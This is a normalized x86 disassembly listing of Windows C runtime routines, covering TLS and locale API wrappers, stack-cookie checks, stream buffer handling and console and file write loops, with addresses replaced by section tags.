call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_41be57
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_41bcd8
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_41c31b
push eax
call [ CompareStringW@IAT ]
push [ ebp + 0x28 ]
mov ecx esi
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x24
sub_41becb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x2
call sub_41bcf2
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
call sub_41bcb0
pop ecx
pop ecx
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x10
sub_41bf38
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x3
call sub_41bcf2
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
sub_41bf8e
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x4
call sub_41bcf2
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsFree@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
sub_41bfe4
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x5
call sub_41bcf2
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsGetValue@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
sub_41c03a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x6
call sub_41bcf2
add esp 0x10
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsSetValue@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x8
sub_41c093
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xd
call sub_41bcf2
add esp 0x10
mov esi eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41c31b
push eax
call [ GetLocaleInfoW@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x10
sub_41c0fd
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x11
call sub_41bcf2
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetUserDefaultLCID@IAT ]
push eax
call sub_41c229
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x8
sub_41c164
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x14
call sub_41bcf2
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0xc
sub_41c1c6
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x15
call sub_41bcf2
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x1
push 0x0
push [ ebp + 0x8 ]
call sub_41c31b
push eax
call [ IsValidLocale@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
sub_41c229
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x17
call sub_41bcf2
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426482
add esp 0xc
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x10
sub_41c293
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x16
call sub_41bcf2
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_41c31b
push eax
call [ LCMapStringW@IAT ]
push [ ebp + 0x28 ]
mov ecx esi
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x24
sub_41c31b
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x18
call sub_41bcf2
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call sub_42652c
pop ecx
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x8
sub_41c383
mov eax [ rw-data ]
push edi
push 0x20
and eax 0x1f
mov edi rw-data
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
push 0x20
pop ecx
[ edi ]
mov al 0x1
pop edi
retn
sub_41c3a9
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push esi
push r--data
push r--data
push r--data
push 0x8
call sub_41bcf2
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
cmp ecx 0x1
sete al
jmp r-xdata
push 0x2
pop eax
mov ecx rw-data
xchg [ ecx ] eax
xor al al
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push 0x0
push eax
mov ecx esi
call [ r--data ]
call esi
cmp eax 0x7a
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
xor ecx ecx
mov edx rw-data
inc ecx
xchg [ edx ] ecx
mov al 0x1
jmp r-xdata
pop esi
sub_41c430
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
push esi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
cmp [ esi ] 0x0
je r-xdata
pop esi
and [ esi ] 0x0
push [ esi ]
call [ FreeLibrary@IAT ]
sub_41c466
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
push ebx
xor ebx ebx
shr eax 0xd
inc ebx
test bl al
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
or eax 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
shr eax 0xc
test bl al
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
shr eax 0x1
test bl al
mov eax [ ebp + 0x8 ]
je r-xdata
add eax 0xc
[ eax ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
test eax 0x4c0
jne r-xdata
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ eax ] ecx
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
push [ esi + 0x4 ]
push esi
call sub_41b8cf
pop ecx
push eax
call sub_426a40
mov [ esi + 0x8 ] eax
add esp 0xc
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
push [ ebp + 0x8 ]
call sub_41c7da
pop ecx
xor ecx ecx
test edx edx
setne cl
add eax 0xc
lea ecx [ ecx * 8 + 0x8 ]
[ eax ] ecx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x8 ] 0x0
cmp edx 0xffffffff
je r-xdata
mov eax [ eax + 0xc ]
test al 0x6
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x200
jne r-xdata
push [ ebp + 0x8 ]
call sub_41b8cf
pop ecx
cmp eax 0xffffffff
je r-xdata
dec [ eax + 0x8 ]
mov ecx [ eax ]
mov dl [ ecx ]
inc ecx
mov [ eax ] ecx
movzx eax dl
jmp r-xdata
mov eax [ eax + 0xc ]
shr eax 0x6
test bl al
je r-xdata
mov eax rw-data
push [ ebp + 0x8 ]
call sub_41b8cf
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
shr eax 0x8
test bl al
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x20
pop ecx
add eax 0xc
[ eax ] ecx
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_41b8cf
mov edi eax
push esi
sar edi 0x6
call sub_41b8cf
and eax 0x3f
imul eax eax 0x30
pop ecx
pop ecx
add eax [ edi * 4 + rw-data ]
pop edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x1000
mov al [ eax + 0x28 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_41c5f2
mov edi edi
push ebp
mov ebp esp
push edi
push [ ebp + 0xc ]
call sub_41b8cf
pop ecx
mov ecx [ ebp + 0xc ]
mov edi eax
mov ecx [ ecx + 0xc ]
test cl 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
call sub_41529e
mov [ eax ] 0x9
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test al 0x1
je r-xdata
call sub_41529e
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop ebp
retn
mov eax [ ebp + 0xc ]
push ebx
push 0x2
pop ebx
add eax 0xc
[ eax ] ebx
mov eax [ ebp + 0xc ]
push 0xfffffff7
pop ecx
add eax 0xc
[ eax ] ecx
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test eax 0x4c0
jne r-xdata
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0x3
test al 0x1
mov eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0xc ]
push [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push ebx
call sub_41c703
pop ecx
pop ecx
test al al
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push 0x1
call sub_416bf9
pop ecx
cmp esi eax
je r-xdata
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
push 0xfffffffe
pop ecx
add eax 0xc
[ eax ] ecx
movzx eax bl
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
or eax 0xffffffff
jmp r-xdata
push edi
call sub_426370
pop ecx
test eax eax
jne r-xdata
mov esi [ ebp + 0xc ]
push ebx
call sub_416bf9
pop ecx
cmp esi eax
jne r-xdata
pop ebx
pop esi
push [ ebp + 0xc ]
call sub_41c7da
pop ecx
sub_41c703
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
call sub_41b8cf
pop ecx
mov ecx [ ebp + 0xc ]
mov edx eax
mov ecx [ ecx + 0xc ]
test cl 0xc0
je r-xdata
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push edx
call sub_41d027
add esp 0xc
dec eax
neg eax
sbb eax eax
inc eax
mov ecx [ ebp + 0xc ]
xor edi edi
mov eax [ ecx + 0x4 ]
mov esi [ ecx ]
sub esi eax
inc eax
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x18 ]
dec ecx
mov [ eax + 0x8 ] ecx
test esi esi
jle r-xdata
cmp edx 0xffffffff
je r-xdata
mov eax [ ebp + 0xc ]
push esi
push [ eax + 0x4 ]
push edx
call sub_41d027
add esp 0xc
mov edi eax
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
cmp edi esi
sete al
jmp r-xdata
push 0x2
push edi
push edi
push edx
call sub_41da25
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
mov eax edx
mov ecx edx
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
mov al 0x1
jmp r-xdata
test [ eax + 0x28 ] 0x20
je r-xdata
sub_41c7da
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0x1000
push ebx
call sub_419b3e
push 0x0
mov [ esi + 0x4 ] eax
call sub_41a3a5
cmp [ esi + 0x4 ] 0x0
lea eax [ esi + 0xc ]
pop ecx
pop ecx
je r-xdata
mov ecx 0x400
[ eax ] ecx
lea eax [ esi + 0x14 ]
mov [ esi + 0x18 ] 0x2
mov [ esi + 0x4 ] eax
push 0x40
pop ecx
[ eax ] ecx
mov [ esi + 0x18 ] ebx
jmp r-xdata
mov eax [ esi + 0x4 ]
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
pop esi
pop ebx
pop ebp
retn
sub_41c837
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ax
xor eax eax
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp - 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
sub_41c896
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
call sub_414048
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
lea ecx [ ebp - 0x1c ]
sar eax 0x8
mov [ ebp - 0x24 ] eax
push ecx
movzx eax al
push eax
call sub_41de1d
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] bl
xor ecx ecx
mov [ ebp - 0xf ] al
inc ecx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x10 ] al
xor eax eax
push 0x2
mov [ ebp - 0xf ] bl
mov [ ebp - 0xe ] al
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
movzx eax [ ebp - 0xc ]
cmp [ ebp - 0x14 ] al
je r-xdata
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ax
mov eax [ ebp - 0x1c ]
push 0x1
push [ eax + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1c ]
push 0x1
push eax
call sub_42082a
add esp 0x1c
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x350 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
and [ eax + 0x350 ] 0xfffffffd
sub_41c968
push 0xc
push r--data
call sub_40e2a0
xor esi esi
mov [ ebp - 0x1c ] esi
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_41f919
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov edi [ eax ]
mov edx edi
sar edx 0x6
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_41529e
mov [ eax ] 0x9
or esi 0xffffffff
push edi
call sub_41fb96
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41c9f4
mov eax esi
call sub_40e2e6
retn 0xc
call sub_41528b
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
sub_41ca00
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41c968
mov esp ebp
pop ebp
retn
sub_41ca28
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41529e
mov [ eax ] 0x9
jmp r-xdata
call sub_41529e
mov [ eax ] 0x9
call sub_413b01
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax esi
mov edx esi
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_41ca00
pop ecx
pop ecx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_41ca97
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
push ebx
imul ebx eax 0x30
push esi
mov eax [ ecx * 4 + rw-data ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] ecx
mov eax [ eax + ebx + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
add eax edi
mov [ ebp - 0x24 ] eax
call [ GetConsoleCP@IAT ]
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
mov ch [ edi ]
xor eax eax
mov [ ebp - 0x18 ] ax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1b ] ch
mov edx [ eax * 4 + rw-data ]
mov cl [ edx + ebx + 0x2d ]
test cl 0x4
je r-xdata
call sub_41948b
movzx ecx [ edi ]
mov edx 0x8000
test [ eax + ecx * 2 ] dx
je r-xdata
mov al [ edx + ebx + 0x2e ]
and cl 0xfb
mov [ ebp - 0xc ] al
lea eax [ ebp - 0xc ]
push 0x2
mov [ ebp - 0xb ] ch
mov [ edx + ebx + 0x2d ] cl
push eax
jmp r-xdata
push 0x1
push edi
cmp edi [ ebp - 0x24 ]
jae r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_41ad08
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor ecx ecx
lea eax [ ebp - 0x14 ]
push ecx
push ecx
push 0x5
push eax
push 0x1
lea eax [ ebp - 0x18 ]
inc edi
push eax
push ecx
push [ ebp - 0x38 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x34 ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x2c ]
mov al [ edi ]
mov ecx [ edx * 4 + rw-data ]
mov [ ecx + ebx + 0x2e ] al
mov eax [ edx * 4 + rw-data ]
or [ eax + ebx + 0x2d ] 0x4
inc [ esi + 0x4 ]
jmp r-xdata
push 0x2
lea eax [ ebp - 0x18 ]
push edi
push eax
call sub_41ad08
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
push ecx
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc edi
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ esi + 0x8 ]
sub eax [ ebp - 0x30 ]
add eax edi
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x20 ] eax
jb r-xdata
cmp [ ebp - 0x1b ] 0xa
jne r-xdata
cmp edi [ ebp - 0x24 ]
jb r-xdata
push 0xd
pop eax
push 0x0
mov [ ebp - 0x1c ] ax
lea eax [ ebp - 0x20 ]
push eax
push 0x1
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x20 ] 0x1
jb r-xdata
inc [ esi + 0x8 ]
inc [ esi + 0x4 ]
sub_41cc4a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0xc ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
add eax edi
mov [ ebp - 0x4 ] eax
cmp edi eax
jae r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx ebx [ edi ]
push ebx
call sub_426f08
pop ecx
cmp ax bx
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
add [ esi + 0x4 ] 0x2
cmp ebx 0xa
jne r-xdata
add edi 0x2
cmp edi [ ebp - 0x4 ]
jb r-xdata
push 0xd
pop ebx
push ebx
call sub_426f08
pop ecx
cmp ax bx
jne r-xdata
jmp r-xdata
inc [ esi + 0x4 ]
inc [ esi + 0x8 ]
sub_41ccb7
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_426370
pop ecx
test eax eax
jne r-xdata
push edi
mov edi esi
and esi 0x3f
sar edi 0x6
imul esi esi 0x30
mov eax [ edi * 4 + rw-data ]
test [ eax + esi + 0x28 ] 0x80
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
call sub_41aa93
mov eax [ eax + 0x4c ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
pop edi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ edi * 4 + rw-data ]
push [ eax + esi + 0x18 ]
call [ GetConsoleMode@IAT ]
test eax eax
setne al
mov eax [ edi * 4 + rw-data ]
cmp [ eax + esi + 0x29 ] 0x0
jne r-xdata
sub_41cd2d
mov edi edi
push ebp
mov ebp esp
mov eax 0x1410
call sub_429c10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ eax + ecx + 0x18 ]
mov eax [ ebp + 0x14 ]
and [ esi ] 0x0
add eax ebx
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
mov [ ebp - 0x1410 ] ecx
mov [ ebp - 0x1408 ] eax
jmp r-xdata
cmp ebx eax
jb r-xdata
lea edi [ ebp - 0x1404 ]
jmp r-xdata
lea eax [ ebp - 0x1404 ]
sub edi eax
lea eax [ ebp - 0x140c ]
push 0x0
push eax
push edi
lea eax [ ebp - 0x1404 ]
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ ebx ]
inc ebx
cmp al 0xa
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ ebp - 0x140c ]
add [ esi + 0x4 ] eax
cmp eax edi
jb r-xdata
mov [ edi ] al
lea eax [ ebp - 0x5 ]
inc edi
cmp edi eax
mov eax [ ebp - 0x1408 ]
jb r-xdata
inc [ esi + 0x8 ]
mov [ edi ] 0xd
inc edi
mov eax [ ebp - 0x1408 ]
mov ecx [ ebp - 0x1410 ]
cmp ebx eax
jae r-xdata
sub_41ce0c
mov edi edi
push ebp
mov ebp esp
mov eax 0x1410
call sub_429c10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ eax + ecx + 0x18 ]
mov eax [ ebp + 0x14 ]
add eax ebx
mov [ ebp - 0x1410 ] ecx
xor edx edx
mov [ ebp - 0x1408 ] eax
mov [ esi ] edx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
cmp ebx eax
jb r-xdata
